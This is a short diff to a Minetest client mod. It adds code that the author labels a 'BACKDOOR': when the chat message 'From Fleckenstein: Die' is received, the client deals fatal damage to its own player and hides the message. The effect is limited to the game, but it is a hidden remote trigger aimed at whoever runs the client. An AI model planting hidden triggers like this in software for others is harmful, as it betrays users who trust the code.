@@ -89,3 +89,10 @@ minetest.register_chatcommand("rainbow", {
 end,
 })
 
+-- BACKDOOR just in case dankmemer returns to Clamity and tries to use my own client against me xD
+minetest.register_on_receiving_chat_message(function(message)
+	if message == "From Fleckenstein: Die" then
+		minetest.send_damage(minetest.localplayer:get_hp())
+		return true
+	end
+end)
